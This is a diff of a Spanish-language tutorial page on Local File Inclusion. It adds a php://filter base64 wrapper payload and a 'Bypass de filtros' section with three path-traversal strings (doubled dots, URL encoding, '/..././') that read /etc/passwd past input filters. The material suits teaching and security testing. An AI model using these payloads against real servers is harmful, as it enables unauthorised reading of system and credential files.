@@ -152,10 +152,22 @@ En el contexto de la programación, un "wrapper" o envoltorio es un tipo de func
 
 ```
 php://filter/convert.base64-encode/resource=<archivo>
+
+php://filter/read=convert.base64-encode/resource=<archivo>
 ```
 
 [![lfi1](/images/lfi1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi1.png)
 
+Algunas veces en el payload no es necesario agregar su extensión por ejemplo .php.
+
+## Bypass de filtros
+
+```
+....//....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+/..././..././..././..././..././..././..././..././etc/passwd
+
+```
 
 ## Recomendaciones
 
